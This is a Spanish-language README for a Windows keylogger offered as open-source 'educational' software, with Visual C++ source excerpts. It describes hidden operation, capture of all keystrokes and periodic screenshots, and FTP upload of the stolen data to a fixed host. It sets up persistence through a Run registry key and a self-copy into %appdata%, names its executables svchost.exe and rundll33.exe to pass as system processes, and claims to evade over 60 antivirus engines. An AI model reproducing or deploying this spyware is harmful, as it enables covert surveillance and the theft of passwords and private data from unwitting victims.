Descripción general
Keylogger es una herramienta ligera de código abierto diseñada únicamente con fines educativos para demostrar capacidades de registro de teclas y monitoreo del sistema. Desarrollado en Visual C++, se ejecuta en modo oculto (ventana invisible) y captura pulsaciones de teclas, clics del ratón y capturas de pantalla periódicas. Los datos capturados se envían a un servidor FTP designado para su análisis.

AVISO LEGAL: Esta herramienta es estrictamente para uso educativo y ético. El uso no autorizado o malicioso está prohibido. Los usuarios son los únicos responsables de sus acciones. Este proyecto se proporciona como software de código abierto sin ninguna garantía.


Características

Operación sigilosa: Se ejecuta de forma invisible en segundo plano, diseñado para ser discreto y resistente a manipulaciones.
Registro de pulsaciones: Captura cada pulsación de tecla, incluidas las eliminadas, con registros detallados para facilitar el análisis.
Capturas de pantalla continuas: Graba capturas de pantalla de programas o sitios web seleccionados, permitiendo una reproducción tipo vídeo (incluye 1.000 capturas).
Integración FTP: Sube automáticamente los registros y capturas al servidor FTP (predeterminado: ftp://192.168.8.2:2121).
Inicio automático: Se configura para lanzarse automáticamente al arrancar el sistema.
Copia automática: Se copia a sí mismo en la carpeta %appdata%/roaming/wpdnse/ para persistencia.


Contenido del repositorio
El archivo Keylogger.zip incluye dos ejecutables y el código fuente completo:

svchost.exe: Proceso principal del keylogger para capturar pulsaciones de teclas y actividad del ratón.
rundll33.exe: Gestiona la captura de pantallas y la subida de registros al servidor FTP.


Nota: Los nombres de los ejecutables están elegidos para mezclarse con el Administrador de tareas con fines demostrativos. Úsalos siempre de forma responsable.


Instalación y uso
Requisitos previos

Un servidor FTP en ejecución en 192.168.8.2:2121 (o configura el tuyo propio).
Sistema operativo Windows (para compatibilidad con el código Visual C++).
Entorno de desarrollo Visual C++ (opcional, para modificar el código fuente).

Pasos

Configurar el servidor FTP:

Configura un servidor FTP en 192.168.8.2:2121 para recibir los registros y capturas.


Ejecutar los archivos:

Ejecuta svchost.exe y rundll33.exe una vez. Se configurarán automáticamente para iniciarse con el sistema.


Monitorear la actividad:

El keylogger capturará pulsaciones, clics del ratón y capturas de pantalla, enviándolos al servidor FTP a intervalos regulares.




Nota: Asegúrate de tener la autorización adecuada para monitorear cualquier sistema. El uso no autorizado puede violar las leyes locales.


Aspectos destacados del código fuente
El proyecto está escrito en Visual C++ e incluye las siguientes funciones clave:
1. Captura de pantallas
Captura el escritorio como imagen JPEG usando GDI+.
cppvoid screenshot(string file) {
    ULONG_PTR gdiplustoken;
    GdiplusStartupInput gdistartupinput;
    GdiplusStartupOutput gdistartupoutput;
    gdistartupinput.SuppressBackgroundThread = true;
    GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput);
    HDC dc = GetDC(GetDesktopWindow());
    HDC dc2 = CreateCompatibleDC(dc);
    RECT rc0kno;
    GetClientRect(GetDesktopWindow(), &rc0kno);
    int w = rc0kno.right - rc0kno.left;
    int h = rc0kno.bottom - rc0kno.top;
    HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);
    HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);
    BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
    Bitmap* bm = new Bitmap(hbitmap, NULL);
    UINT num, size;
    ImageCodecInfo* imagecodecinfo;
    GetImageEncodersSize(&num, &size);
    imagecodecinfo = (ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, imagecodecinfo);
    CLSID clsidEncoder;
    for (int i = 0; i < num; i++) {
        if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
            clsidEncoder = imagecodecinfo[i].Clsid;
    }
    free(imagecodecinfo);
    wstring ws;
    ws.assign(file.begin(), file.end());
    bm->Save(ws.c_str(), &clsidEncoder);
    SelectObject(dc2, holdbitmap);
    DeleteObject(dc2);
    DeleteObject(hbitmap);
    ReleaseDC(GetDesktopWindow(), dc);
    GdiplusShutdown(gdiplustoken);
}
2. Envío de capturas al FTP
Sube las capturas de pantalla al servidor FTP especificado.
cppvoid ftp_scrshot_send() {
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    DWORD rec_timeout = 5000;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        log_error_file << "Error:" << GetLastError();
    } else {
        hFtpSession = InternetConnect(hInternet, "192.168.8.2", 2121, NULL, NULL, INTERNET_SERVICE_FTP, 0, 0);
        InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &rec_timeout, sizeof(rec_timeout));
        if (hFtpSession == NULL) {
            log_error_file << "Error:" << GetLastError();
        } else {
            if (!FtpPutFile(hFtpSession, "core32.mni", "hacks/sc/dc.jpg", FTP_TRANSFER_TYPE_BINARY, 0)) {
                log_error_file << "Error:" << GetLastError();
            }
        }
    }
    log_error_file.close();
}
3. Envío de registros de teclas al FTP
Sube los datos del registro de teclas al servidor FTP.
cppvoid ftplogsend() {
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    DWORD rec_timeout = 2000;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        log_error_file << "Error:" << GetLastError();
    } else {
        hFtpSession = InternetConnect(hInternet, "192.168.8.2", 2121, NULL, NULL, INTERNET_SERVICE_FTP, 0, 0);
        InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &rec_timeout, sizeof(rec_timeout));
        if (hFtpSession == NULL) {
            log_error_file << "Error:" << GetLastError();
        } else {
            if (!FtpPutFile(hFtpSession, "atapi.sys", "hacks/hacks.txt", FTP_TRANSFER_TYPE_BINARY, 0)) {
                log_error_file << "Error:" << GetLastError();
                log_error_file.close();
            }
        }
    }
}
4. Copia automática e inicialización del archivo de registro
Garantiza la persistencia copiando el ejecutable a %appdata% e inicializando los registros con una marca de tiempo.
cppvoid AutoCopy() {
    string f_path = userlc;
    string f_name = f_path + "\\svchost.exe";
    char my_name[260];
    GetModuleFileName(GetModuleHandle(0), my_name, 260);
    string f_my = my_name;
    CreateDirectory(f_path.c_str(), NULL);
    CopyFile(f_my.c_str(), f_name.c_str(), FALSE);
}

void Install() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    string yearS = to_string(st.wYear) + "_";
    string monthS = to_string(st.wMonth) + "-";
    string dayS = to_string(st.wDay) + "-";
    string hourS = to_string(st.wHour) + "H-";
    string mintueS = to_string(st.wMinute) + "M------------>\n\n";
    string startDate = "\n\n" + dayS + monthS + yearS + hourS + mintueS;
    char dateCh[260];
    strcpy(dateCh, startDate.c_str());
    string ff_path = userlc + "atapi.sys";
    FILE* file = fopen(ff_path.c_str(), "a+");
    fputs(dateCh, file);
    fclose(file);
}
5. Inicio automático al arrancar el sistema
Configura el keylogger para ejecutarse automáticamente al inicio del sistema.
cppvoid AutoStart() {
    char Driver[MAX_PATH];
    HKEY hKey;
    string ff_path = userlc + "svchost.exe";
    strcpy(Driver, ff_path.c_str());
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}

Detección por antivirus
Este keylogger fue diseñado para eludir más de 60 programas antivirus (según un informe desactualizado de VirusTotal). Sin embargo, las actualizaciones modernas de antivirus pueden detectarlo. Pruébalo siempre en un entorno controlado.

Advertencia: La captura de pantalla del informe de VirusTotal (virustotal.PNG) está desactualizada y es solo de referencia.

